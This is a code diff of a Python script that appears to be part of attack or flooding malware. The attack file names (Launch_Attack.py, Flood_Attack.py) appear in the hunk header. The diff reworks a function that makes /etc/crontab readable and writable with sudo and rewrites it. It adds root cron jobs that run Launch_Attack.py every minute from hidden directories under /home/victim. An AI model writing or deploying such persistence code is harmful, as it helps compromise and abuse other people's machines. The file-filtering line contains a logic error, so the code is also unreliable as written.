@@ -7,10 +7,30 @@ attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
 
 
 def set_up_crontab():
+    # Read Crontab
+    os.system('sudo chmod +r /etc/crontab')
+
+    crontab = open('/etc/crontab', 'r')
+
+    writeLines = [line for line in crontab if line != '\n' or line != '']
+
+    crontab.close()
+
+    # Write Crontab
     os.system('sudo chmod +w /etc/crontab')
-    crontab = open('/etc/crontab', 'a')
-    crontab.write('\n* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py')
-    crontab.write('\n* * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py')
+
+    crontab = open('/etc/crontab', 'w')
+
+    etcAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py\n'
+    varAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py'
+
+    s = ''
+    for writeLine in writeLines:
+        s += writeLine
+
+    s += (etcAttackCommand + varAttackCommand)
+
+    crontab.write(s)
     crontab.close()
 
     return
